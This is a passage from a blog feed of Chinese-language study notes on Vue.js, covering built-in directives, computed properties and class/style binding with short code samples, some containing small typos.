    <title>Vue.js实战（3）</title>
    <link href="/2020/11/20/Vue.js%E5%AE%9E%E6%88%98%EF%BC%883%EF%BC%89/"/>
    <url>/2020/11/20/Vue.js%E5%AE%9E%E6%88%98%EF%BC%883%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch5-内置指令"><a href="#Ch5-内置指令" class="headerlink" title="Ch5 内置指令"></a>Ch5 内置指令</h1><h3 id="5-1-基本指令"><a href="#5-1-基本指令" class="headerlink" title="5.1 基本指令"></a>5.1 基本指令</h3><p>1.v-cloak<br>网速较慢时，vue.js还没有加载完成，页面会显示空内容，用v-cloak解决；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span> <span class="hljs-attr">cloak</span>&gt;</span><br>    &#123;&#123; content &#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>[cloak]&#123;<br>display:none;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.v-once</p><p>仅仅渲染一次，首次渲染后，不在随数据的变化而变化，视为静态内容；</p><p>3.v-if、v-else-if、v-else</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;status===1&quot;</span>&gt;</span>显示状态1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">&quot;status===2&quot;</span>&gt;</span>显示状态2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-else</span>=<span class="hljs-string">&quot;status===3&quot;</span>&gt;</span>显示状态3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    //判断多个元素，使用<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>一个简单的切换按钮效果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;type=== &#x27;name&#x27;&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br>     <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-else</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;xxx@xx.com&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeMode&quot;</span>&gt;</span>切换<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br> <br> <br> <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">     <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">         <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">         <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">             <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;name&#x27;</span>,</span><br><span class="language-javascript">         &#125;,</span><br><span class="language-javascript">         <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">             <span class="hljs-attr">changeMode</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                 <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span>=<span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span>===<span class="hljs-string">&#x27;name&#x27;</span>?<span class="hljs-string">&#x27;mail&#x27;</span>:<span class="hljs-string">&#x27;name&#x27;</span>;</span><br><span class="language-javascript">             &#125;</span><br><span class="language-javascript">         &#125;</span><br><span class="language-javascript">     &#125;)</span><br><span class="language-javascript"> </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.v-show:与if基本一致，但是不可以用在’’’&lt;template&gt;&lt;/template&gt;’’’</p><p>区别：v-if只有为true的时候才会编译渲染，而v-show只是css属性切换，一定会编译，适用于经常切换的场合；</p><p>5.v-for：数组遍历及枚举</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;book in books&quot;</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>data:&#123;<br>books:[<br>&#123; name: &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">Book1</span>&gt;</span>&#x27; &#125;,<br>   &#123; name: &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">Book1</span>&gt;</span>&#x27; &#125;,<br>   &#123; name: &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">Book1</span>&gt;</span>&#x27; &#125;, <br>   ]<br>   &#125;,<br></code></pre></td></tr></table></figure><h3 id="5-3过滤与排序：使用计算属性返回处理后的数组"><a href="#5-3过滤与排序：使用计算属性返回处理后的数组" class="headerlink" title="5.3过滤与排序：使用计算属性返回处理后的数组"></a>5.3过滤与排序：使用计算属性返回处理后的数组</h3><p>筛选数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">computed:&#123;<br>       filterBooks:function()&#123;<br>           return this.books.filter(function(book)&#123;<br>               return book.name.match(/Book2/);<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><h3 id="5-4-方法与事件"><a href="#5-4-方法与事件" class="headerlink" title="5.4 方法与事件"></a>5.4 方法与事件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html">//一个小的计数器<br> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>            点击次数：&#123;&#123; counter &#125;&#125;<br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;counter++&quot;</span>&gt;</span>Click<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;add10&quot;</span>&gt;</span>Click +10<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;reset_counter&quot;</span>&gt;</span>Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">     <span class="hljs-attr">add10</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">counter</span>+=<span class="hljs-number">10</span>;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">     <span class="hljs-attr">reset_counter</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                     <span class="hljs-variable language_">this</span>.<span class="hljs-property">counter</span>=<span class="hljs-number">0</span>;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>5.4.2 修饰符</p><p>修饰符</p><table><thead><tr><th>.stop</th><th>.prevent</th><th align="left">.capture</th></tr></thead><tbody><tr><td>.self</td><td>.once</td><td align="left">.enter</td></tr><tr><td>.tab</td><td>.delete</td><td align="left">.esc</td></tr><tr><td>.space</td><td>.up</td><td align="left">.down</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（2）</title>
    <link href="/2020/11/18/Vue.js%E5%AE%9E%E6%88%98%EF%BC%882%EF%BC%89/"/>
    <url>/2020/11/18/Vue.js%E5%AE%9E%E6%88%98%EF%BC%882%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch3-计算属性"><a href="#Ch3-计算属性" class="headerlink" title="Ch3 计算属性"></a>Ch3 计算属性</h1><p>1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">reversedText</span> &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">data</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;123,456&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">computed</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-attr">reversedText</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">                &#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>2.用法</p><p>计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；</p><p>3.和methods的区别</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&lt;div&gt;<br>    &#123;&#123; reversedText &#125;&#125;<br>&lt;/div&gt;<br><br>&lt;scirpt&gt;<br>    methods:&#123;<br>        <span class="hljs-attr">reverserText</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-keyword">return</span> this.<span class="hljs-built_in">text</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>).reverser().join(<span class="hljs-string">&#x27;,&#x27;</span>);<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">computed</span>:&#123;<br>         <span class="hljs-attr">reversedText</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>             <span class="hljs-keyword">return</span> this.<span class="hljs-built_in">text</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>).<span class="hljs-built_in">reverse</span>().join(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    &#125;<br>&lt;/scirpt&gt;<br></code></pre></td></tr></table></figure><p>两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；</p><p>当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；</p><h1 id="CH4-v-bind及class与style的绑定"><a href="#CH4-v-bind及class与style的绑定" class="headerlink" title="CH4 v-bind及class与style的绑定"></a>CH4 v-bind及class与style的绑定</h1><p>1.v-bind指令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">v-bind:src:</span>=<span class="hljs-string">&quot;imageUrl&quot;</span>/&gt;</span><br><br>     <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imageUrl&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;...&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">imageUrl</span>:<span class="hljs-string">&#x27;...&#x27;</span>,</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.绑定class的几种方法</p><p> （1）表达式为真，则加载css</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir"> &lt;div <span class="hljs-symbol">:class=<span class="hljs-string">&quot;&#123; &#x27;active&#x27;:isActive,&#x27;error&#x27;:isError &#125;&quot;</span>&gt;&lt;/div&gt;</span><br><br>&lt;script&gt;<br> <span class="hljs-symbol">data:</span>&#123;<br>      <span class="hljs-symbol">isActive:</span> <span class="hljs-literal">true</span>,<br>      <span class="hljs-symbol">isError:</span><span class="hljs-literal">false</span>,<br> &#125;<br> &lt;/script&gt;<br></code></pre></td></tr></table></figure><p> （2）使用computed</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div :<span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">classes</span>&quot;&gt;&lt;/<span class="hljs-symbol">div</span>&gt;<br><br>&lt;<span class="hljs-symbol">script</span>&gt;<br>    <span class="hljs-symbol">computed:<span class="hljs-symbol">function</span></span>()&#123;<br>        <span class="hljs-keyword">return</span>:&#123;<br>            active:<span class="hljs-keyword">this</span>.isActive,<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p> (3)组件上使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml">  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.article</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.active</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: black;</span><br><span class="language-css">            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">my-component</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;&#123; &#x27;active&#x27;: isActive &#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;my-component&#x27;</span>,&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>:<span class="hljs-string">&#x27;&lt;p class=&quot;article&quot;&gt;这是一个组件&lt;/p&gt;&#x27;</span></span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#app&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">isActive</span>:<span class="hljs-literal">true</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3.绑定内联样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">div</span> :style=<span class="hljs-string">&quot;styles&quot;</span>&gt;<br>            这是第二个组件<br>        &lt;/div&gt;<br><br>  data:&#123;<br>            isActive:true,<br>            styles:&#123;<br>                <span class="hljs-attribute">color</span>:<span class="hljs-string">&#x27;pink&#x27;</span>,<br>                fontSize: <span class="hljs-number">35</span> +<span class="hljs-string">&#x27;px&#x27;</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（2）</title>
    <link href="/2020/11/18/Ch3%20%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7/"/>
    <url>/2020/11/18/Ch3%20%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch3-计算属性"><a href="#Ch3-计算属性" class="headerlink" title="Ch3 计算属性"></a>Ch3 计算属性</h1><p>1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>            &#123;&#123; reversedText &#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;123,456&#x27;</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">reversedText</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.用法</p><p>计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；</p><p>3.和methods的区别</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    &#123;&#123; reversedText &#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">scirpt</span>&gt;</span><br>methods:&#123;<br>    reverserText:function()&#123;<br>    return this.text.split(&#x27;,&#x27;).reverser().join(&#x27;,&#x27;);<br>    &#125;<br>    &#125;,<br>    computed:&#123;<br>     reversedText: function()&#123;<br>         return this.text.split(&#x27;,&#x27;).reverse().join(&#x27;,&#x27;);<br>    &#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">scirpt</span>&gt;</span><br></code></pre></td></tr></table></figure><p>两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；</p><p>当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；</p><h1 id="CH4-v-bind及class与style的绑定"><a href="#CH4-v-bind及class与style的绑定" class="headerlink" title="CH4 v-bind及class与style的绑定"></a>CH4 v-bind及class与style的绑定</h1><p>1.v-bind指令</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">v-bind:src:</span>=<span class="hljs-string">&quot;imageUrl&quot;</span>/&gt;</span><br>    <br>     <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imageUrl&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;...&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">imageUrl</span>:<span class="hljs-string">&#x27;...&#x27;</span>,</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.绑定class的几种方法</p><p>​    （1）表达式为真，则加载css</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;&#123; 